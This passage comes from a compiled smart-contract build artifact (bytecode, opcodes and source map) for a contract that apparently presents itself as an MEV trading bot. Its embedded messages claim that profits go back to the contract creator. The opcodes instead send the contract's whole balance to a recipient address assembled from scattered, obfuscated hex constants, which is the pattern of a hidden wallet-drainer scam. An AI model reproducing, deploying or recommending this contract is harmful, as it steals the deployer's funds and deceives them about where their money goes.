6000803e3d6000fd5b50565b6000610407610402610423565b61056c565b905090565b600061041e610419610423565b61056c565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107c5565b6107d1565b6108d7565b90506000638595ce91905060006206804890506000640ec044cf089050600061049b610a32565b905060006104a7610a3d565b905060606104bd876104b8886107d1565b6108d7565b905060606104db6104cd876107d1565b6104d6876107d1565b6108d7565b905060606104e8856107d1565b905060606104f5856107d1565b9050606061051561050686866108d7565b61051085856108d7565b6108d7565b905060606105586040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836108d7565b9050809c5050505050505050505050505090565b6000606082905060008090506000806000600290505b602a8110156107b8576101008402935084818151811061059e57fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105c057fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610611575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15610621576057830392506106bb565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561065f575060468373ffffffffffffffffffffffffffffffffffffffff1611155b1561066f576037830392506106ba565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106ad575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106b9576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156106f9575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610709576057820391506107a3565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610747575060468273ffffffffffffffffffffffffffffffffffffffff1611155b15610757576037820391506107a2565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610795575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107a1576030820391505b5b5b81601084020184019350600281019050610582565b5082945050505050919050565b6000630c1b01a5905090565b6060600080905060008390505b60008114610800578180600101925050601081816107f857fe5b0490506107de565b60608267ffffffffffffffff8111801561081957600080fd5b506040519080825280601f01601f19166020018201604052801561084c5781602001600182028036833780820191505090505b50905060008090505b838110156108cb576010868161086757fe5b06925061087383610a48565b826001838703038151811061088457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108bd57fe5b049550806001019050610855565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff811180156108ff57600080fd5b506040519080825280601f01601f1916602001820160405280156109325781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156109b05785828151811061095757fe5b602001015160f81c60f81b83828060010193508151811061097457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610942565b600091505b8451821015610a23578482815181106109ca57fe5b602001015160f81c60f81b8382806001019350815181106109e757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109b5565b82965050505050505092915050565b600062901082905090565b60006207cf51905090565b60008160ff16600011158015610a62575060098260ff1611155b15610a9757817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610aec565b8160ff16600a11158015610aaf5750600f8260ff1611155b15610ae757600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610aec565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea26469706673582212204007bec56630b677258ac908ed53977053e3baaba4c545d175dc595c968cf28764736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x35A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB25 PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x312 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x357 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xAF2 PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x3AD PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3F2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7C5 JUMP JUMPDEST PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH4 0x8595CE91 SWAP1 POP PUSH1 0x0 PUSH3 0x68048 SWAP1 POP PUSH1 0x0 PUSH5 0xEC044CF08 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xA32 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4A7 PUSH2 0xA3D JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4BD DUP8 PUSH2 0x4B8 DUP9 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4DB PUSH2 0x4CD DUP8 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x4D6 DUP8 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4E8 DUP6 PUSH2 0x7D1 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4F5 DUP6 PUSH2 0x7D1 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x515 PUSH2 0x506 DUP7 DUP7 PUSH2 0x8D7 JUMP JUMPDEST PUSH2 0x510 DUP6 DUP6 PUSH2 0x8D7 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x558 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7B8 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x59E JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5C0 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x611 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x621 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6BB JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65F JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66F JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6BA JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6AD JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6B9 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F9 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x709 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7A3 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x747 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x757 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7A2 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x795 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7A1 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x582 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xC1B01A5 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x800 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x7F8 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x7DE JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x819 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x84C JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8CB JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x867 JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x873 DUP4 PUSH2 0xA48 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x884 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8BD JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x855 JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x8FF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x932 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x9B0 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x957 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x974 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x942 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA23 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9CA JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9E7 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9B5 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x901082 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x7CF51 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xA62 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA97 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAEC JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xAAF JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xAE7 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAEC JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA26469706673582212204007 0xBE 0xC5 PUSH7 0x30B677258AC908 0xED MSTORE8 SWAP8 PUSH17 0x53E3BAABA4C545D175DC595C968CF28764 PUSH20 0x6F6C634300060600330000000000000000000000 ",
							"sourceMap": "516:16378:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;539:23:0;;5:9:-1;2:2;;;27:1;24;17:12;2:2;539:23:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;539:23:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;568:25;;5:9:-1;2:2;;;27:1;24;17:12;2:2;568:25:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;568:25:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;14787:184;;;:::i;:::-;;15082:187;;;:::i;:::-;;539:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;568:25::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;14787:184::-;14834:63;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;14915:16;:14;:16::i;:::-;14907:34;;:57;14942:21;14907:57;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;14907:57:0;14787:184::o;15082:187::-;15134:58;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15210:19;:17;:19::i;:::-;15202:37;;:60;15240:21;15202:60;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;15202:60:0;15082:187::o;14508:109::-;14557:7;14583:27;14596:13;:11;:13::i;:::-;14583:12;:27::i;:::-;14576:34;;14508:109;:::o;15993:112::-;16045:7;16071:27;16084:13;:11;:13::i;:::-;16071:12;:27::i;:::-;16064:34;;15993:112;:::o;12945:902::-;12991:13;13016:28;13047:48;;;;;;;;;;;;;;;;;;13060:34;13075:18;:16;:18::i;:::-;13060:14;:34::i;:::-;13047:7;:48::i;:::-;13016:79;;13105:16;13124:10;13105:29;;13144:19;13166:6;13144:28;;13182:17;13202:11;13182:31;;13223:19;13245:18;:16;:18::i;:::-;13223:40;;13273:18;13294:17;:15;:17::i;:::-;13273:38;;13322:23;13348:52;13356:14;13372:27;13387:11;13372:14;:27::i;:::-;13348:7;:52::i;:::-;13322:78;;13410:23;13436:69;13444:30;13459:14;13444;:30::i;:::-;13476:28;13491:12;13476:14;:28::i;:::-;13436:7;:69::i;:::-;13410:95;;13515:23;13541:30;13556:14;13541;:30::i;:::-;13515:56;;13581:23;13607:29;13622:13;13607:14;:29::i;:::-;13581:55;;13647:26;13676:69;13684:29;13692:9;13703;13684:7;:29::i;:::-;13715;13723:9;13734;13715:7;:29::i;:::-;13676:7;:69::i;:::-;13647:98;;13755:26;13784;;;;;;;;;;;;;;;;;;13797:12;13784:7;:26::i;:::-;13755:55;;13828:12;13821:19;;;;;;;;;;;;;;12945:902;:::o;8276:912::-;8339:15;8366:16;8391:2;8366:28;;8404:13;8420:1;8404:17;;8431:10;8451;8477:6;8486:1;8477:10;;8472:679;8493:10;8489:1;:14;8472:679;;;8536:3;8527:12;;;;8572:3;8576:1;8572:6;;;;;;;;;;;;;;;;8566:13;;8558:22;;8553:27;;8613:3;8621:1;8617;:5;8613:10;;;;;;;;;;;;;;;;8607:17;;8599:26;;8594:31;;8650:2;8644;:8;;;;8643:25;;;;;8664:3;8658:2;:9;;;;8643:25;8639:226;;;8694:2;8688:8;;;;8639:226;;;8728:2;8722;:8;;;;8721:24;;;;;8742:2;8736;:8;;;;8721:24;8717:148;;;8771:2;8765